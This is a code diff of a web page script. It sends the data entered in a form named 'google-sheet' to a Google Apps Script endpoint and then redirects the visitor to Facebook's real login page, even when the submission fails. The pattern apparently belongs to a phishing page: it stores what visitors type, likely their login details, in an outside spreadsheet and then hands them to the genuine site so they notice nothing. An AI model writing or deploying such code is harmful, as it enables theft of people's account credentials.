@@ -47,15 +47,28 @@
     </div>
   </form>
   
-  <script type="text/javascript">
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbz1mFbb56F00cPdk2IkkDG15qiVdrFpq-ivUPPs3ZOf5ZnjY80_UodUa7YK_4rTJeVp/exec'
-    const form = document.forms['google-sheet']
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbz1mFbb56F00cPdk2IkkDG15qiVdrFpq-ivUPPs3ZOf5ZnjY80_UodUa7YK_4rTJeVp/exec';
+    const form = document.forms['google-sheet'];
   
-    form.addEventListener('submit', e => {
-      e.preventDefault()
-      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-  
-    })
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      // Submit to Google Sheets
+      fetch(scriptURL, { 
+        method: 'POST', 
+        body: new FormData(form) 
+      })
+      .then(response => {
+        // After successful submission, redirect to Facebook
+        window.location.href = 'https://www.facebook.com/login';
+      })
+      .catch(error => {
+        console.error('Error!', error.message);
+        // If submission fails, still redirect to Facebook
+        window.location.href = 'https://www.facebook.com/login';
+      });
+    });
   </script>
   
 </body>
